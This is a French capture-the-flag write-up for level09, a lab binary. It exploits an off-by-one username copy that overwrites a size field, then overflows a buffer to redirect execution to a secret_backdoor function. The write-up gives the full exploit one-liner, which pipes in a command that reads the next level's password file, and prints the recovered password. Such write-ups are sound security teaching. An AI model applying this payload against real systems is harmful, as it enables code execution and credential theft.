### level09

Arrivés à cet exercice, nous remarquons très vite la fonction ``secret_backdoor`` présente dans le code.
Dedans, nous retrouvons une fonction system, qui va nous permettre d'exécuter une commande bash.
Si nous recherchons l'adresse de cette secret_backdoor avec gdb, nous retrouvons ceci :

```bash
objdump -t level09 | grep secret
000000000000088c g     F .text	0000000000000034              secret_backdoor
```

L'adresse est donc 0x88c. Cette adresse est très courte, car il s'agit d'une adresse relative.

Afin de la recalculer, nous allons rechercher l'adresse de départ du code :
l'adresse de départ du code est la suivante : 0x555555554000

Pour récupérer l'adresse absolue, nous devons donc faire : ``<adresse de base> + <adresse relative> = <adresse absolue>``
Nous avons donc

```bash 0x555555554000 + 0x88c = 0x55555555488c ```

Nous avons aussi une structure présente dans le code :

```c
typedef struct  s_msg {
    char        message[140];
    char        username[40];
    int         size;
}               t_msg;
```

L'inconvénient des structures est que toutes les valeurs sont les unes derrière les autres dans la mémoire, donc en cas de dépassement de capacité (overflow), nous pourrons écrire dans les données qui suivent. Dans le programme, lors du remplissage du username, nous pouvons voir cette boucle for :

```c
for (int i = 0; i <= 40 && s[i]; i++)
    msg->username[i] = s[i];
```

Le problème étant que le username ne possède que 40 emplacements mémoire (0 à 39), or ici nous remplissons jusqu'au 41ème emplacement (0 à 40). Si nous écrivons quelque chose dans le 40ème emplacement, nous allons donc écrire dans le size de la structure.

La fonction strncpy va écrire le nombre de caractères qui sera saisi dans cet overflow :

```c
strncpy(msg->message, s, msg->size);
```

Nous allons exécuter un petit script afin de savoir si cela peut provoquer un segfault après une certaine valeur.

```bash
for i in {0..300}; do val=$(printf "%x" $i); (python -c "print('A' * 40) + '\x$val'") | ./level09 ; echo $i; echo $val; done
```

Ce qui nous donne ce resultat:

```bash
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
200
c8
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
Segmentation fault (core dumped)
201
c9
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
Segmentation fault (core dumped)
202
ca
```

Après une taille (size) de 200, le programme se met donc à segfault. Nous allons donc chercher à remplir avec l'adresse de notre fameuse backdoor. Comme nous allons insérer 8 caractères avec l'adresse de la fonction, nous allons donc écrire 208 caractères (soit \xd0).

```bash
(python -c "print('A' * 40 + '\xd0' + '\n' + 'B' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00')"; python -c "print('cat /home/users/end/.pass')") | ./level09
```

Et nous retrouvons ce résultat final :

```bash
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
Segmentation fault (core dumped)
```